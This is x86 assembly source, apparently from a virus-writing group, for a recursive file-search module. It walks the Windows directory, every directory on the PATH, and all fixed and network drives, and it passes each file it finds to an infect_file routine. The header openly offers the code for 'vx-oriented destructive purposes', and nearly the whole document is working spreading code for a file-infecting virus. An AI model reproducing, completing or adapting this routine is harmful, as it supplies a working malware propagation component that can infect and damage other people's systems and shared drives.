
; RECSERCH 1.50


;                                DESCRIPTION
;
; here is asm source of recursive file search & other shit you need so much ;)
;
; subroutines:
;
; з process_windir()            process directory %windir% & all subdirs
; ц process_path()              process all directories/subdirs from %path%
; ц process_drives()            recursive process each fixed drive
; юд process_directory()       process specified directory & all subdirs
;      юд process_file()       process specified file (dump filename)
;
; all subroutines are offset-independent, i.e. you may call'em with any
; displacement.
;
;                                 DISCLAIMER
;
; You're free you use these sources for any vx-oriented destructive purposes.
; No fuckin pacific or commercial usage available.
;
;                               Seek & Enjoy! X-)
;                                                      http://z0mbie.cjb.net


ff_struc                struc                   ; win32 "searchrec" structure
ff_attr                 dd      ?
ff_time_create          dd      ?,?
ff_time_lastaccess      dd      ?,?
ff_time_lastwrite       dd      ?,?
ff_size_hi              dd      ?
ff_size                 dd      ?
                        dd      ?,?
ff_fullname             db      260 dup (?)
ff_shortname            db      14 dup (?)
                        ends

; subroutine: process_windir
; action:     process md directory & all subdirs
;             1. get %windir%
;             2. call process_directory
; input:      EDI=ff_struc
; output:     none

process_windir          proc    pascal
                        local   windir:BYTE:1024
                        pusha
                        lea     eax, windir
                        push    eax
                        push    1024
                        push    eax
                        call    xxGetWindowsDirectoryA
                        pop     edx
                        call    process_directory
                        popa
                        ret
                        endp

; subroutine: process_path
; action:     process all dirs/subdirs from %path%
;             1. get %path%
;             2. parse %path% and call process_directory for each dirname
; input:      EDI=ff_struc
; output:     none

process_path            proc    pascal
                        local   path:BYTE:1024
                        pusha
                        lea     esi, path
                        mov     dword ptr [esi], not 'PATH'
                        not     dword ptr [esi]
                        mov     byte ptr [esi+4], 0
                        mov     ebx, 1024-1
                        push    ebx
                        push    esi
                        push    esi
                        call    xxGetEnvironmentVariableA
                        mov     byte ptr [esi+ebx], 0
__cycle:                mov     edx, esi
__scan:                 lodsb
                        or      al, al
                        jz      __done
                        cmp     al, ';'
                        jne     __scan
__done:                 sub     [esi-1], al
                        call    process_directory
                        or      al, al
                        jnz     __cycle
                        popa
                        ret
                        endp

; subroutine: process_drives
; action:     for each drive (A:..Z:) with type DRIVE_FIXED||DRIVE_REMOTE
;             call subroutine process_directory passing drive's root as arg
; input:      EDI=ff_struc
; output:     none

process_drives:         pusha
                        mov     eax, -'\:A'
                        neg     eax
                        push    eax
__cycle:                push    esp
                        call    xxGetDriveTypeA
                        sub     eax, 3        ; DRIVE_FIXED=3  DRIVE_REMOTE=4
                        cmp     eax, 1
                        ja      __next
                        mov     edx, esp
                        call    process_directory
__next:                 inc     byte ptr [esp]
                        cmp     byte ptr [esp], 'Z'
                        jbe     __cycle
                        pop     ecx
                        popa
                        ret

; subroutine: process_directory
; action:     1. set current directory to one specified by EDX
;             2. find all files in the current directory
;             3. for each found directory (except "."/"..") recursive call;
;                for each found file call process_file
;             4. set current directory to ".."
; input:      EDI=ff_struc
;             EDX=directory name (should be full path if 1st call)
; output:     none

process_directory:      pusha

                        mov     ecx, 1024/4
__0:                    push    ecx
                        dec     ecx
                        jnz     __0

                        mov     ebx, edi
                        mov     esi, edx
                        mov     edi, esp
__1:                    lodsb
                        stosb
                        or      al, al
                        jnz     __1
                        dec     edi
                        mov     al, '\'
                        cmp     [edi-1], al
                        je      __3
                        stosb
__3:                    mov     ebp, edi
                        mov     eax, not '*.*'
                        not     eax
                        stosd
                        mov     edi, ebx

                        mov     eax, esp
                        push    edi
                        push    eax
                        call    xxFindFirstFileA
                        mov     esi, eax
                        inc     eax
                        jz      __exit

__cycle:

                        pusha
                        lea     esi, [edi].ff_fullname
                        mov     edi, ebp
__2:                    lodsb
                        stosb
                        or      al, al
                        jnz     __2
                        popa

                        mov     edx, esp

                        test    byte ptr [edi].ff_attr, 16
                        jnz     __dir

                        call    process_file

                        jmp     __next

__dir:                  lea     eax, [edi].ff_fullname
                        cmp     byte ptr [eax], '.'
                        je      __next

                        call    process_directory

__next:                 push    edi
                        push    esi
                        call    xxFindNextFileA
                        or      eax, eax
                        jnz     __cycle

__exit:                 push    esi
                        call    xxFindClose

                        add     esp, 1024

                        popa
                        ret

; subroutine: process_file
; action:     handle each file found by process_directory
; input:      EDI=ff_struc
;             EDX=file name ([edi].ff_fullname)
; output:     none

process_file:           pusha

                        call    infect_file

                        popa
                        ret
